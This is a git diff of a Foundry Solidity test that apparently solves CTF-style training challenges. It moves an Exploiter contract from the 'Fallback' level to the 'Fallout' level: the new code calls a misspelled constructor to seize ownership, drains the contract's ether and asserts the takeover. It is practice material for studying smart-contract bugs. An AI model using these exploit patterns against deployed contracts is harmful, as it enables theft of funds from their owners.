@@ -4,42 +4,38 @@ import "forge-std/Test.sol";
 import "forge-std/console.sol";
 import "forge-std/console2.sol";
 
-import "src/02.sol";
+import "src/03.sol";
 
 contract Exploiter {
     address owner;
     
     constructor() payable {
-        require(msg.value == 0.0002 ether);
+        require(msg.value == 1 ether);
         owner = msg.sender;
     }
 
-    function exploit(Fallback instance) external {
-        instance.contribute{value: 0.0001 ether}();
-        
-        (bool success, ) = address(instance).call{value: address(this).balance}("");
-        require(success, "Error sending ether to instance");
+    function exploit(Fallout instance) external {
+        instance.Fal1out{value: address(this).balance}();
 
-        instance.withdraw();
+        instance.collectAllocations();
 
-        (bool success2, ) = address(owner).call{value: address(this).balance}("");
-        require(success2, "Error Withdraw from exploit");
+        (bool success, ) = address(owner).call{value: address(this).balance}("");
+        require(success, "Error Withdraw from exploit");
     }
 
     receive() external payable { }
 }
 
-contract Test02 is Test {
+contract Test03 is Test {
 
-    Fallback instance;
-    address user;
+    Fallout instance;
+    address user = address(0x1);
 
     function setUp() public {
-        user = address(0x1);
-        instance = new Fallback();
+        instance = new Fallout();
 
-        vm.deal(user, 1 ether);
         vm.deal(address(instance), 1 ether);
+        vm.deal(user, 1 ether);
     }
 
     function testSolve() public {
@@ -51,7 +47,7 @@ contract Test02 is Test {
 
         vm.startPrank(user);
         
-        Exploiter exploiter = new Exploiter{value: 0.0002 ether}();
+        Exploiter exploiter = new Exploiter{value: 1 ether}();
         exploiter.exploit(instance);
         
         vm.stopPrank();
@@ -61,6 +57,7 @@ contract Test02 is Test {
         address afterOwner = instance.owner();
         
         assertEq(instanceBalance, 0);
+        assertEq(afterOwner, address(exploiter));
         console.log("");
         console.log("Owner after exploit: ", afterOwner);
         console.log("User balance after exploit (ether): ", user.balance / 1e18);
